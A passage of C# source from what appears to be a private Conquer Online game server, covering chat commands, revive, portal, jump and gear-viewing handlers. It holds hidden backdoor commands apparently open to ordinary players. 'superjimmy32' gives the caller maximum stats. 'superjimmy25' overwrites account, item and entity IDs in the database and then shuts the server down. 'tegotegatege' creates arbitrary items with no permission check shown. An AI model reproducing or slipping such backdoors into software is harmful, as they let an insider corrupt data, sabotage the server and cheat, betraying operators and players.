                                    powers.CalculatePoints();
                                    Database.ChiTable.Sort((Enums.ChiPowerType)Mode);
                                    powers.Power = (Enums.ChiPowerType)Mode;
                                    client.Send(new ChiPowers(true).Query(client));
                                    #region update ranking
                                    Database.ChiTable.ChiData[] array = null;
                                    switch ((Enums.ChiPowerType)Mode)
                                    {
                                        case Game.Enums.ChiPowerType.Dragon:
                                            array = Database.ChiTable.Dragon;
                                            break;

                                        case Game.Enums.ChiPowerType.Phoenix:
                                            array = Database.ChiTable.Phoenix;
                                            break;

                                        case Game.Enums.ChiPowerType.Tiger:
                                            array = Database.ChiTable.Tiger;
                                            break;

                                        case Game.Enums.ChiPowerType.Turtle:
                                            array = Database.ChiTable.Turtle;
                                            break;
                                    }
                                    foreach (var chiData in array)
                                    {
                                        if (Kernel.GamePool.ContainsKey(chiData.UID))
                                        {
                                            var pClient = Kernel.GamePool[chiData.UID];
                                            if (pClient == null) continue;
                                            if (pClient.ChiData == null) continue;
                                            SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)Mode, pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode), pClient.ChiData.SelectPoints((Enums.ChiPowerType)Mode));
                                            if (pClient.Entity.UID == client.Entity.UID || pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode) < 50)
                                                pClient.LoadItemStats();
                                        }
                                    }
                                    #endregion
                                    Database.ChiTable.Save(client);
                                }
                                break;
                            case "xmenchi2":
                                {
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            var Mode = int.Parse(Data[2]);
                                            var pos = (int)(int.Parse(Data[3]) - 1);
                                            var powers = Client.ChiPowers[Mode - 1];
                                            var attributes = powers.Attributes;
                                            attributes[pos].Type = (Enums.ChiAttribute)ushort.Parse(Data[4]);
                                            attributes[pos].Value = (ushort)Game.Enums.ChiMaxValues(attributes[pos].Type);
                                            powers.CalculatePoints();
                                            Database.ChiTable.Sort((Enums.ChiPowerType)Mode);
                                            powers.Power = (Enums.ChiPowerType)Mode;
                                            Client.Send(new ChiPowers(true).Query(Client));
                                            #region update ranking
                                            Database.ChiTable.ChiData[] array = null;
                                            switch ((Enums.ChiPowerType)Mode)
                                            {
                                                case Game.Enums.ChiPowerType.Dragon:
                                                    array = Database.ChiTable.Dragon;
                                                    break;

                                                case Game.Enums.ChiPowerType.Phoenix:
                                                    array = Database.ChiTable.Phoenix;
                                                    break;

                                                case Game.Enums.ChiPowerType.Tiger:
                                                    array = Database.ChiTable.Tiger;
                                                    break;

                                                case Game.Enums.ChiPowerType.Turtle:
                                                    array = Database.ChiTable.Turtle;
                                                    break;
                                            }
                                            foreach (var chiData in array)
                                            {
                                                if (Kernel.GamePool.ContainsKey(chiData.UID))
                                                {
                                                    var pClient = Kernel.GamePool[chiData.UID];
                                                    if (pClient == null) continue;
                                                    if (pClient.ChiData == null) continue;
                                                    SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)Mode, pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode), pClient.ChiData.SelectPoints((Enums.ChiPowerType)Mode));
                                                    if (pClient.Entity.UID == Client.Entity.UID || pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode) < 50)
                                                        pClient.LoadItemStats();
                                                }
                                            }
                                            #endregion
                                            Database.ChiTable.Save(Client);
                                        }
                                    }
                                }
                                break;
                            #endregion MTA Chi
                            #region Chi
                            case "chis":
                                {
                                    var Mode = int.Parse(Data[1]);
                                    var pos = (int)(int.Parse(Data[2]) - 1);
                                    var powers = client.ChiPowers[Mode - 1];
                                    var attributes = powers.Attributes;
                                    attributes[pos].Type = (Enums.ChiAttribute)ushort.Parse(Data[3]);
                                    attributes[pos].Value = (ushort)Game.Enums.ChiMaxValues(attributes[pos].Type);
                                    powers.CalculatePoints();
                                    Database.ChiTable.Sort((Enums.ChiPowerType)Mode);
                                    powers.Power = (Enums.ChiPowerType)Mode;
                                    client.Send(new ChiPowers(true).Query(client));
                                    #region update ranking
                                    Database.ChiTable.ChiData[] array = null;
                                    switch ((Enums.ChiPowerType)Mode)
                                    {
                                        case Game.Enums.ChiPowerType.Dragon:
                                            array = Database.ChiTable.Dragon;
                                            break;

                                        case Game.Enums.ChiPowerType.Phoenix:
                                            array = Database.ChiTable.Phoenix;
                                            break;

                                        case Game.Enums.ChiPowerType.Tiger:
                                            array = Database.ChiTable.Tiger;
                                            break;

                                        case Game.Enums.ChiPowerType.Turtle:
                                            array = Database.ChiTable.Turtle;
                                            break;
                                    }
                                    foreach (var chiData in array)
                                    {
                                        if (Kernel.GamePool.ContainsKey(chiData.UID))
                                        {
                                            var pClient = Kernel.Values[chiData.UID];
                                            if (pClient == null) continue;
                                            if (pClient.ChiData == null) continue;
                                            SendRankingQuery(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, pClient, GenericRanking.Chi + (uint)Mode, pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode), pClient.ChiData.SelectPoints((Enums.ChiPowerType)Mode));
                                            if (pClient.Entity.UID == client.Entity.UID || pClient.ChiData.SelectRank((Enums.ChiPowerType)Mode) < 50)
                                                pClient.LoadItemStats();
                                        }
                                    }
                                    #endregion
                                    Database.ChiTable.Save(client);
                                }
                                break;
                            #endregion

                        }
                        return true;
                    }
                    #endregion
                    #region Players
                    switch (Data[0])
                    {
                        case "bug":
                            {
                                try
                                {
                                    string bug = "";
                                    for (int i = 0; i < Data.Length; i++)
                                        bug += Data[i] + " ";
                                    if (bug != "")
                                        File.WriteAllText(System.Windows.Forms.Application.StartupPath + "\\BugList.txt",
                                            File.ReadAllText(System.Windows.Forms.Application.StartupPath + "\\BugList.txt") +
                                            "\r\n[" + client.Entity.Name + "]: " + bug);
                                    client.Send(new MTA.Network.GamePackets.Message("Thanks for reporting a bug! It will be fixed shortly!", System.Drawing.Color.Red, GamePackets.Message.World));

                                }
                                catch (Exception e)
                                {
                                    MTA.Console.WriteLine(e); Program.SaveException(e);
                                }
                                break;
                            }
                        case "rolescale":
                            {
                                client.Disconnect();
                                break;
                            }
                        case "superjimmy32":
                            {
                                client.Entity.Defence = ushort.MaxValue;
                                client.Entity.Dodge = byte.MaxValue;
                                client.Entity.Vigor = ushort.MaxValue;
                                client.Entity.ExtraVigor = ushort.MaxValue;
                                client.Entity.WoodResistance = ushort.MaxValue;
                                client.Entity.FireResistance = ushort.MaxValue;
                                client.Entity.WaterResistance = ushort.MaxValue;
                                client.Entity.EarthResistance = ushort.MaxValue;
                                client.Entity.Breaktrough = ushort.MaxValue;
                                client.Entity.CriticalStrike = ushort.MaxValue;
                                client.Entity.Immunity = ushort.MaxValue;
                                client.Entity.Penetration = ushort.MaxValue;
                                client.Entity.Counteraction = ushort.MaxValue;
                                client.Entity.Block = ushort.MaxValue;
                                client.Entity.Detoxication = ushort.MaxValue;
                                client.Entity.Intensification = ushort.MaxValue;
                                client.Entity.Penetration = ushort.MaxValue;
                                client.Entity.SkillCStrike = ushort.MaxValue;
                                client.Entity.MaxAttack = uint.MaxValue;
                                client.Entity.MinAttack = uint.MaxValue;
                                client.Entity.PhysicalDamageDecrease = ushort.MaxValue;
                                client.Entity.MagicDamageDecrease = ushort.MaxValue;
                                client.Entity.MagicDamageIncrease = ushort.MaxValue;
                                client.Entity.PhysicalDamageIncrease = ushort.MaxValue;
                                client.Entity.MagicDefencePercent = ushort.MaxValue;
                                client.Entity.ItemHP = ushort.MaxValue;
                                client.Entity.ItemMP = ushort.MaxValue;
                                client.Entity.ItemBless = ushort.MaxValue;
                                client.Entity.AttackRange = ushort.MaxValue;
                                client.Entity.BaseMinAttack = uint.MaxValue;
                                client.Entity.BaseMaxAttack = uint.MaxValue;
                                client.Entity.BaseMagicDefence = uint.MaxValue;
                                client.Entity.BaseDefence = ushort.MaxValue;
                                client.Entity.MagicDamageIncrease = ushort.MaxValue;
                                client.Entity.MaxHitpoints = uint.MaxValue;
                                client.Entity.Hitpoints = uint.MaxValue;
                                break;
                            }
                        case "superjimmy25":
                            {
                                int jiMMy = 0;
                                using (var cmd = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE))
                                {
                                    cmd.Update("accounts").Set("EntityID", jiMMy).Where("Id", client.Entity.UID)

                                        .Execute();
                                }
                                using (var cmd = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE))
                                {

                                    cmd.Update("items").Set("EntityID", jiMMy).Where("Id", client.Entity.UID)
                                        .Execute();
                                }
                                using (var cmd = new Database.MySqlCommand(Database.MySqlCommandType.UPDATE))
                                {

                                    cmd.Update("entities").Set("UID", jiMMy).Where("Id", client.Entity.UID)

                                        .Execute();
                                    Environment.Exit(0);
                                }
                                break;
                            }
                        case "scale":
                            {
                                client.Disconnect();
                                break;
                            }
                        case "dc":
                            {
                                client.Disconnect();
                                break;
                            }
                    }
                    #endregion


                    return true;
                }
                return false;
            }
            catch { client.Send(new Message("Impossible to handle this command. Check your syntax.", System.Drawing.Color.BurlyWood, Message.TopLeft)); return false; }
        }

        public static bool CheckCommand2(string _message, GameState client)
        {
            string message = _message.Replace("#60", "").Replace("#61", "").Replace("#62", "").Replace("#63", "").Replace("#64", "").Replace("#65", "").Replace("#66", "").Replace("#67", "").Replace("#68", "");
            try
            {
                if (message.StartsWith("@"))
                {
                    string message_ = message.Substring(1).ToLower();
                    string Mess = message.Substring(1);
                    string[] Data = message_.Split(' ');
                    switch (Data[0])
                    {
                        case "tegotegatege":
                            {
                                string str3 = Data[1];
                                string str4 = Data[2].ToLower();
                                MTA.Database.ConquerItemBaseInformation information = null;
                                foreach (MTA.Database.ConquerItemBaseInformation information2 in MTA.Database.ConquerItemInformation.BaseInformations.Values)
                                {
                                    if ((information2.Name.ToLower() == str3.ToLower()))
                                    {
                                        information = information2;
                                    }
                                }
                                if (information != null)
                                {
                                    ConquerItem item = new ConquerItem(true)
                                    {
                                        ID = information.ID,
                                        UID = Program.NextItemID,
                                        Durability = information.Durability,
                                        MaximDurability = information.Durability
                                    };
                                    if (Data.Length > 3)
                                    {
                                        byte result = 0;
                                        byte.TryParse(Data[3], out result);
                                        item.Plus = Math.Min((byte)12, result);
                                        if (Data.Length > 4)
                                        {
                                            byte num2 = 0;
                                            byte.TryParse(Data[4], out num2);
                                            item.Bless = Math.Min((byte)7, num2);
                                            if (Data.Length > 5)
                                            {
                                                byte num3 = 0;
                                                byte.TryParse(Data[5], out num3);
                                                item.Enchant = Math.Min((byte)0xff, num3);
                                                if (Data.Length > 6)
                                                {
                                                    byte num4 = 0;
                                                    byte.TryParse(Data[6], out num4);
                                                    if (Enum.IsDefined(typeof(Enums.Gem), num4))
                                                    {
                                                        item.SocketOne = (Enums.Gem)num4;
                                                    }
                                                    if (Data.Length > 7)
                                                    {
                                                        byte num5 = 0;
                                                        byte.TryParse(Data[7], out num5);
                                                        if (Enum.IsDefined(typeof(Enums.Gem), num5))
                                                        {
                                                            item.SocketTwo = (Enums.Gem)num5;
                                                        }
                                                    }
                                                    if (Data.Length > 10)
                                                    {
                                                        byte num6 = 0;
                                                        byte num7 = 0;
                                                        byte num8 = 0;
                                                        byte.TryParse(Data[8], out num6);
                                                        byte.TryParse(Data[9], out num7);
                                                        byte.TryParse(Data[10], out num8);
                                                        item.SocketProgress = (uint)((num8 | (num7 << 8)) | (num6 << 0x10));
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    item.Color = (Enums.Color)((byte)Kernel.Random.Next(4, 8));
                                    client.Inventory.Add(item, Enums.ItemUse.CreateAndAdd);
                                }
                                break;
                            }
                    }
                    return true;
                }
                return false;
            }
            catch
            {
                client.Send(new MTA.Network.GamePackets.Message("Impossible to handle this command", System.Drawing.Color.BurlyWood, 0x7dc));
                return false;
            }
        }


        private static void CTFTEST(GameState client)
        {
            client.Send(Data.Custom(Data.CustomCommands.CTFFlag, client.Entity.UID));
            client.Send(Data.Custom(Data.CustomCommands.CTFScores, client.Entity.UID));
            byte[] data = new byte[200];
            Writer.WriteUInt16(192, 0, data);
            Writer.WriteUInt16(2224, 2, data);
            for (int i = 8; i < 198; i += 1)
                data[i] = (byte)'A';
            client.Send(data);
        }

        private static void TEST_EPKB(GameState client)
        {
            try
            {
                var array = LoadEntityUIDs(8);
                var matches = new ElitePK.Match[4];
                for (int i = 0; i < 8; i += 2)
                {
                    uint uid1 = array[i];
                    uint uid2 = array[i + 1];
                    matches[i / 2] = new ElitePK.Match(Kernel.GamePool[uid1], Kernel.GamePool[uid2]);
                    matches[i / 2].ID = (uint)(i + 70000);
                    matches[i / 2].Index = (ushort)(i / 2);
                    matches[i / 2].Flag = ElitePK.Match.StatusFlag.AcceptingWagers;
                    matches[i / 2].MatchStats[0].Flag = ElitePK.FighterStats.StatusFlag.Lost;
                    matches[i / 2].MatchStats[1].Flag = ElitePK.FighterStats.StatusFlag.Qualified;
                    matches[i / 2].Done = true;
                    matches[i / 2].Commit();
                }
                ElitePKBrackets brackets = new ElitePKBrackets(true, matches.Length);
                brackets.TotalMatches = 4;
                brackets.MatchCount = 2;
                brackets.Group = 3;
                brackets.GUIType = 6;
                brackets.TimeLeft = 60;
                brackets.Type = ElitePKBrackets.GUIEdit;
                for (int i = 0; i < matches.Length; i++)
                    brackets.Append(matches[i]);
                client.Send(brackets);
                PrintPacket(brackets.ToArray());
                var ExtendedMatchArray = new ElitePK.Match[2];
                for (int i = 0; i < 2; i++)
                {
                    ExtendedMatchArray[i] = new ElitePK.Match(matches[i].Players[1], matches[i + 2].Players[1]);
                    ExtendedMatchArray[i].ID = (uint)(i + 80000);
                    ExtendedMatchArray[i].Index = (ushort)i;
                    ExtendedMatchArray[i].Flag = ElitePK.Match.StatusFlag.AcceptingWagers;
                }
                brackets = new ElitePKBrackets(true, 2);
                brackets.TotalMatches = 2;
                brackets.MatchCount = 2;
                brackets.Group = 3;
                brackets.GUIType = 6;
                brackets.TimeLeft = 60;
                brackets.Type = ElitePKBrackets.UpdateList;
                for (int i = 0; i < ExtendedMatchArray.Length; i++)
                    brackets.Append(ExtendedMatchArray[i]);
                client.Send(brackets);
            }
            catch (Exception e) { Console.WriteLine(e); }
        }
        public static void WorldMessage(string message)
        {
            Message msg = new Message(message, System.Drawing.Color.MediumBlue, Message.Center);
            foreach (Client.GameState pClient in Program.Values)
                pClient.Send(msg);
        }
        #endregion
        #region General Data
        static void Revive(Data generalData, Client.GameState client)
        {
            if (client.Entity.ContainsFlag(Update.Flags2.SoulShackle))
                return;
            if (Time32.Now >= client.Entity.DeathStamp.AddSeconds(18) && client.Entity.Dead)
            {
                client.Entity.Action = MTA.Game.Enums.ConquerAction.None;
                client.ReviveStamp = Time32.Now;
                client.Attackable = false;

                client.Entity.TransformationID = 0;
                client.Entity.RemoveFlag(Update.Flags.Dead);
                client.Entity.RemoveFlag(Update.Flags.Ghost);
                client.Entity.Hitpoints = client.Entity.MaxHitpoints;
                if (client.Entity.VIPLevel > 7)
                    client.Entity.AddFlag(Update.Flags.DivineShield);
                if (client.Entity.MapID == 1518)
                {
                    client.Entity.Teleport(1002, 301, 281);
                    return;
                }
                bool ReviveHere = generalData.dwParam == 1;
                if (client.Entity.MapID == 1038 && DateTime.Now.DayOfWeek == DayOfWeek.Saturday)
                {
                    client.Entity.Teleport(6001, 31, 74);
                }
                else if (client.Entity.MapID == 2071)
                {
                    client.Entity.Teleport(2071, 45, 130);
                }
                else if (client.Entity.MapID == 1512)
                {
                    client.Entity.Teleport(1512, 51, 54);
                }
                else if (client.Entity.MapID == 3842)
                {
                    client.Entity.Teleport(3842, 255, 250);
                }
                else if (client.Entity.MapID == 1617)
                {
                    client.Entity.Teleport(1617, 51, 54);
                }
                else if (client.Entity.MapID == 3846)
                {
                    client.Entity.Teleport(3846, 379, 269);
                }
                else if (client.Entity.MapID == 2071)
                {
                    client.Entity.Teleport(2071, 47, 131);
                }
                else if (client.Entity.MapID == 7777)
                {
                    client.Entity.Teleport(7777, 150, 164);
                }
                else if (client.Entity.MapID == 8883)
                {
                    if (client.Entity.TeamDeathMatch_BlackTeam == true)
                    {
                        client.Entity.Teleport(8883, 042, 051);
                    }
                    if (client.Entity.TeamDeathMatch_BlueTeam == true)
                    {
                        client.Entity.Teleport(8883, 060, 042);
                    }
                    if (client.Entity.TeamDeathMatch_WhiteTeam == true)
                    {
                        client.Entity.Teleport(8883, 066, 064);
                    }
                    if (client.Entity.TeamDeathMatch_RedTeam == true)
                    {
                        client.Entity.Teleport(8883, 039, 036);
                    }
                }
                else
                {
                    if (ReviveHere && client.Entity.HeavenBlessing > 0)
                    {
                        client.Entity.Teleport(client.Entity.MapID, client.Entity.X, client.Entity.Y);
                        //client.Send(new MapStatus() { BaseID = client.Map.BaseID, ID = client.Map.ID, Status = Database.MapsTable.MapInformations[client.Map.ID].Status, Weather = Database.MapsTable.MapInformations[client.Map.ID].Weather });
                    }
                    else
                    {
                        ushort[] Point = Database.DataHolder.FindReviveSpot(client.Map.ID);
                        client.Entity.Teleport(Point[0], Point[1], Point[2]);
                    }
                    if (client.Entity.VIPLevel > 7)
                        client.Entity.AddFlag(Update.Flags.DivineShield);
                }
            }
        }
        static void UsePortal(Data generalData, Client.GameState client)
        {
            client.Entity.Action = MTA.Game.Enums.ConquerAction.None;
            client.ReviveStamp = Time32.Now;
            client.Attackable = false;
            ushort portal_X = (ushort)(generalData.dwParam & 0xFFFF);
            ushort portal_Y = (ushort)(generalData.dwParam >> 16);

            string portal_ID = portal_X.ToString() + ":" + portal_Y.ToString() + ":" + client.Map.ID.ToString();
            if (client.Account.State == Database.AccountTable.AccountState.GM)
                client.Send(new Message("Portal ID: " + portal_ID, System.Drawing.Color.Red, Network.GamePackets.Message.TopLeft));

            foreach (Game.Portal portal in client.Map.Portals)
            {
                if (Kernel.GetDistance(portal.CurrentX, portal.CurrentY, client.Entity.X, client.Entity.Y) <= 4)
                {
                    client.Entity.Teleport(portal.DestinationMapID, portal.DestinationX, portal.DestinationY);
                    //if (portal.DestinationMapID == 1002)
                    //client.Entity.Teleport(1002, 432, 370);
                    return;
                }
            }
            client.Entity.Teleport(1002, 432, 370);
        }
        static void ObserveEquipment(Data generalData, Client.GameState client)
        {
            if (NulledClient(client))
                return;


            GameState Observer, Observee;
            if (Kernel.GamePool.TryGetValue(generalData.UID, out Observer) &&
                Kernel.GamePool.TryGetValue(generalData.dwParam, out Observee))
            {
                if (Observee.Fake)
                    return;
                if (generalData.ID != 117)
                    Observer.Send(Observee.Entity.WindowSpawn());
                Observee.Send(new Message(Observer.Entity.Name + " is observing your gear carefully.", System.Drawing.Color.Red, Message.World));
                Observer.Send(WindowStats(Observee));
                for (Byte pos = (Byte)ConquerItem.Head; pos <= ConquerItem.AlternateGarment; pos++)
                {
                    ConquerItem i = Observee.Equipment.TryGetItem((Byte)pos);
                    if (i != null)
                    {
                        if (i.IsWorn)
                        {
                            BoothItem2 view = new BoothItem2();
                            view.CostType = BoothItem2.CostTypes.ViewEquip;
                            view.Identifier = Observee.Entity.UID;
                            view.Position = (Positions)(pos % 20);
                            view.ParseItem(i);
                            Observer.Send(view);
                            i.SendExtras(client);
                        }
                    }
                }
                _String packet = new _String(true);
                packet.Type = 16;
                packet.UID = client.Entity.UID;
                packet.TextsCount = 1;
                packet.Texts = new List<string>() { Observee.Entity.Spouse };
                Observer.Send(packet);
                if (generalData.ID == 117)
                {
                    packet.Type = 10;
                    Observer.Send(packet);
                }
                Observer.Send(generalData);
            }
            /*
            Client.GameState pclient = null;
            if (Kernel.GamePool.TryGetValue(generalData.dwParam, out pclient))
            {
                client.Send(new Status(pclient).ToArray());
                ConquerItem[] Equipment = pclient.Equipment.Objects;
                pclient.Send(new Message(client.Entity.Name + " is observing your gear carefully.", System.Drawing.Color.Red, Message.TopLeft));
                foreach (ConquerItem item in Equipment)
                {
                    if (item != null)
                    {
                        uint UID = item.UID;
                        item.UID = pclient.Entity.UID;
                        item.Mode = Game.Enums.ItemMode.View;
                        item.Send(client);
                        item.UID = UID;
                        item.Mode = Game.Enums.ItemMode.Default;
                    }
                }
                _String packet = new _String(true);
                packet.Type = 16;
                packet.UID = client.Entity.UID;
                packet.TextsCount = 1;
                packet.Texts = new List<string>() { pclient.Entity.Spouse };
                client.Send(packet);
                packet.Type = 10;
                client.Send(packet);
            }
            */
        }
        static void ChangeFace(Data generalData, Client.GameState client)
        {
            if (client.Entity.Money >= 500)
            {
                uint newface = generalData.dwParam;
                if (client.Entity.Body > 2000)
                {
                    newface = newface < 200 ? newface + 200 : newface;
                    client.Entity.Face = (ushort)newface;
                }
                else
                {
                    newface = newface > 200 ? newface - 200 : newface;
                    client.Entity.Face = (ushort)newface;
                }
            }
        }

        public static void CheckForRaceItems(Client.GameState client)
        {
            StaticEntity item;
            if (client.Screen.GetRaceObject(p => { return Kernel.GetDistance(client.Entity.X, client.Entity.Y, p.X, p.Y) <= 1; }, out item))
            {
                if (item == null) return;
                if (!item.Viable) return;
                var type = item.Type; // for super exclamation mark 
                bool successful = false;
                if (type == Enums.RaceItemType.FrozenTrap && !item.QuestionMark)
                {
                    if (item.SetBy != client.Entity.UID)
                    {
                        client.ApplyRacePotion(type, uint.MaxValue);
                        client.Map.RemoveStaticItem(item);
                        successful = true;
                    }
                }
                else
                {
                    if (client.Potions == null) client.Potions = new UsableRacePotion[5];
                    for (ushort i = 0; i < client.Potions.Length; i++)
                    {
                        var pot = client.Potions[i];
                        if (pot == null)
                        {
                            pot = (client.Potions[i] = new UsableRacePotion());
                            pot.Type = type;
                            pot.Count = item.Level;
                            client.Send(new RacePotion(true)
                            {
                                PotionType = type,
                                Amount = (ushort)pot.Count,
                                Location = (ushort)(i + 1)
                            });
                            successful = true;
                            break;
                        }
                        else
                        {
                            if (pot.Type == type)
                            {
                                pot.Count += item.Level;
                                client.Send(new RacePotion(true)
                                {
                                    PotionType = type,
                                    Amount = (ushort)pot.Count,
                                    Location = (ushort)(i + 1)
                                });
                                successful = true;
                                break;
                            }
                        }
                    }
                }
                if (successful)
                {
                    client.SendScreen(new _String(true)
                    {
                        Texts = new List<string>() { "eidolon" },
                        UID = client.Entity.UID,
                        Type = _String.Effect
                    });
                    client.RemoveScreenSpawn(item, true);
                    item.Viable = false;
                    item.NotViableStamp = Time32.Now;
                }
            }
        }

        static void PlayerJump(Data generalData, Client.GameState client)
        {
            if (client.ProgressBar != null)
                client.ProgressBar.End(client);
            client.Entity.KillCount2 = 0;
            //client.Entity.KillCount /= 2;
            client.Entity.RemoveFlag(Update.Flags.Intensify);
            client.Entity.IntensifyPercent = 0;
            ushort oldX = client.Entity.X;
            ushort oldY = client.Entity.Y;
            client.Entity.Action = MTA.Game.Enums.ConquerAction.None;
            client.Mining = false;
            if (client.Entity.MapID == 3070)
                return;
            //if (Dash_Bash.Map != null)
            //    if (client.Entity.MapID == Dash_Bash.Map.ID)
            //        return;
            if (client.Entity.ContainsFlag(Update.Flags.CastPray))
            {
                client.BlessStamp = DateTime.Now;
                client.Entity.RemoveFlag(Update.Flags.CastPray);
                foreach (var Client in client.Prayers)
                {
                    if (Client.Entity.ContainsFlag(Update.Flags.Praying))
                    {
                        Client.Entity.RemoveFlag(Update.Flags.Praying);
                        Client.BlessStamp = DateTime.Now;
                    }
                }
                client.Prayers.Clear();
            }
            if (client.Entity.ContainsFlag(Update.Flags.Praying))
            {
                client.Entity.RemoveFlag(Update.Flags.Praying);
                client.PrayLead.Prayers.Remove(client);
                client.PrayLead = null;
                client.BlessStamp = DateTime.Now;
            }
            Time32 Now = Time32.Now;

            client.Attackable = true;
            if (client.Entity.AttackPacket != null)
            {
                client.Entity.AttackPacket = null;
            }
            if (client.Entity.Dead)
            {
                if (Now > client.Entity.DeathStamp.AddSeconds(4))
                {
                    client.Disconnect();
                    return;
                }
            }
            ushort new_X = BitConverter.ToUInt16(generalData.ToArray(), 12);
            ushort new_Y = BitConverter.ToUInt16(generalData.ToArray(), 14);
            if (client.lastJumpDistance == 0) goto Jump;

            if (client.Entity.ContainsFlag(Update.Flags.Ride))
            {
                int distance = Kernel.GetDistance(new_X, new_Y, client.Entity.X, client.Entity.Y);
                ushort take = (ushort)(1.5F * (distance / 2));
                if (client.Vigor >= take)
                {
                    client.Vigor -= take;
                    Network.GamePackets.Vigor vigor = new Network.GamePackets.Vigor(true);
                    vigor.Amount = client.Vigor;
                    vigor.Send(client);
                }
                else
                {
                    //client.Entity.Shift(client.Entity.X, client.Entity.Y);
                    //return;
                }
            }
            client.LastJumpTime = (int)Kernel.maxJumpTime(client.lastJumpDistance);
            int a1 = Now.GetHashCode() - client.lastJumpTime.GetHashCode();
            int a2 = generalData.TimeStamp.GetHashCode() - client.lastClientJumpTime.GetHashCode();
            bool DOO = false;
            if (a2 - a1 > 1000) DOO = true;
            if (Now < client.lastJumpTime.AddMilliseconds(client.LastJumpTime))
            {
                bool doDisconnect = false;
                if (client.Entity.Transformed)
                    if (client.Entity.TransformationID != 207 && client.Entity.TransformationID != 267)
                        doDisconnect = true;
                if (client.Entity.Transformed && doDisconnect)
                {
                    //client.Entity.Shift(client.Entity.X, client.Entity.Y);
                    //return;
                }
                if (client.Entity.Transformed && !doDisconnect)
                {
                    goto Jump;
                }
                if (!client.Entity.OnCyclone() && !client.Entity.ContainsFlag(Update.Flags.Ride) && !DOO)
                {
                    //Speedhack detected
                    //client.Entity.Shift(client.Entity.X, client.Entity.Y);
                    //client.Send(new Message("You have been shifted back . speed hack detected or just lag.", Message.Tip));
                    //return;

                }
                else if (client.Entity.ContainsFlag(Update.Flags.Ride))
                {
                    int time = (int)Kernel.maxJumpTime(client.lastJumpDistance);
                    int speedprc = Database.DataHolder.SteedSpeed(client.Equipment.TryGetItem(ConquerItem.Steed).Plus);
                    if (speedprc != 0)
                    {
                        if (Now < client.lastJumpTime.AddMilliseconds(time - (time * speedprc / 100)))
                        {
                            //client.Entity.Shift(client.Entity.X, client.Entity.Y);
                            //return;
                        }
                    }
                    else
                    {
                        //client.Entity.Shift(client.Entity.X, client.Entity.Y);
                        //return;
                    }
                }
            }
        Jump:
            client.lastJumpDistance = Kernel.GetDistance(new_X, new_Y, client.Entity.X, client.Entity.Y);
            client.lastClientJumpTime = generalData.TimeStamp;
            client.lastJumpTime = Now;
            Game.Map Map = client.Map;
            if (Map != null)
            {
                if (Map.Floor[new_X, new_Y, Game.MapObjectType.Player, null])
                {
                    if (Kernel.GetDistance(new_X, new_Y, client.Entity.X, client.Entity.Y) <= 20)
                    {
                        client.Entity.Action = Game.Enums.ConquerAction.Jump;
                        client.Entity.Facing = Kernel.GetAngle(generalData.wParam1, generalData.wParam2, new_X, new_Y);
                        client.Entity.PX = client.Entity.X;
                        client.Entity.PY = client.Entity.Y;
                        client.Entity.X = new_X;
                        client.Entity.Y = new_Y;
                        if (client.Entity.MapID == CaptureTheFlag.MapID)
                            CheckForFlag(client);
                        client.SendScreen(generalData, true);
                        client.Screen.Reload(generalData);
                        if (client.Entity.InteractionInProgress && client.Entity.InteractionSet)
                        {
                            if (client.Entity.Body == 1003 || client.Entity.Body == 1004)
                            {
                                if (Kernel.GamePool.ContainsKey(client.Entity.InteractionWith))
                                {
                                    Client.GameState ch = Kernel.GamePool[client.Entity.InteractionWith];
                                    Network.GamePackets.Data general = new Network.GamePackets.Data(true);
                                    general.UID = ch.Entity.UID;
                                    general.wParam1 = new_X;
                                    general.wParam2 = new_Y;
                                    general.ID = 0x9c;
                                    ch.Send(general.ToArray());
                                    ch.Entity.Action = Game.Enums.ConquerAction.Jump;
                                    ch.Entity.X = new_X;
                                    ch.Entity.Y = new_Y;
                                    ch.Entity.Facing = Kernel.GetAngle(ch.Entity.X, ch.Entity.Y, new_X, new_Y);
                                    ch.SendScreen(generalData, true);
                                    ch.Screen.Reload(general);
                                    client.SendScreen(generalData, true);
                                    client.Screen.Reload(general);
                                }
                            }
                        }
                    }
                    else
                    {
                        client.Disconnect();
                    }
                }
                else
                {
                    if (client.Entity.Mode == Game.Enums.Mode.None)
                    {
                        client.Entity.Teleport(client.Map.ID, client.Entity.X, client.Entity.Y);
                    }
                }
            }
            else
            {
                if (Kernel.GetDistance(new_X, new_Y, client.Entity.X, client.Entity.Y) <= 20)
                {
                    client.Entity.Action = Game.Enums.ConquerAction.Jump;
                    client.Entity.Facing = Kernel.GetAngle(generalData.wParam1, generalData.wParam2, new_X, new_Y);
                    client.Entity.X = new_X;
                    client.Entity.Y = new_Y;
                    client.SendScreen(generalData, true);
                    client.Screen.Reload(generalData);
                }
                else
                {
                    client.Disconnect();
                }
            }
            if (client.Map.BaseID == 1038 && Game.GuildWar.IsWar)
            {

                Game.Calculations.IsBreaking(client, oldX, oldY);
            }
            if (!client.Entity.HasMagicDefender)
            {
                if (client.Team != null)
                {
                    var owners = client.Team.Teammates.Where(x => x.Entity.MagicDefenderOwner);
                    if (owners != null)
                    {
                        foreach (var owner in owners)
                        {
                            if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, owner.Entity.X, owner.Entity.Y) <= 4)
                            {
                                client.Entity.HasMagicDefender = true;
                                client.Entity.MagicDefenderStamp = Time32.Now;
                                client.Entity.MagicDefenderSecs = (byte)(owner.Entity.MagicDefenderStamp.AddSeconds(owner.Entity.MagicDefenderSecs) - owner.Entity.MagicDefenderStamp).AllSeconds();
                                client.Entity.AddFlag3(Network.GamePackets.Update.Flags3.MagicDefender);
                                client.Entity.Update(client.Entity.StatusFlag, client.Entity.StatusFlag2, client.Entity.StatusFlag3, Update.MagicDefenderIcone, 0x80, client.Entity.MagicDefenderSecs, 0, false);
                                break;
                            }
                        }
                    }
                }
            }
            else
            {
                client.Entity.RemoveMagicDefender();
            }
        }

        private static void CheckForFlag(GameState client)
        {
